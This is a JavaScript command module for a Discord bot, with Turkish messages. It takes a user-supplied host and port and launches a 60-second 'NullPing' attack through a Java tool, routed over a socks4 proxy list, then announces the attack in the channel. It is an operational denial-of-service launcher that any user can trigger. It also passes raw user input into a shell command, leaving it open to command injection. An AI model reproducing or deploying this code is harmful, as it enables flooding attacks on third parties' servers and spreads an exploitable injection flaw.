const Discord = require("discord.js");
const moment = require('moment');

exports.run = async (client, message, args) => {
const host = args.join(" ").split(":").slice(0,1)
const port = message.content.split (":")[1]
var exec = require('child_process').exec
exec(`cmd /c java -jar nullping.jar host-${host} port-${port} file-socks4.txt mode-handlerfucker time-60`, (error, stdout, stderr) => {
});
console.log('Bir Saldırı Başlatıldı Discord ID:' +  message.guild.id)
message.channel.send(`**NullPing** Saldırısı Başlatıldı, Ip Adresi **${host}** Port **${port}** Süre **60 Saniye** <a:ates:760221854957830174>`)
}



exports.conf = {
  enabled: true,
  guildOnly: false,
  aliases: ['NullPing'],
  permLevel: 0
}

exports.help = {
  name: 'nullping',
  description: 'Özel',
  usage: 'nullping'
}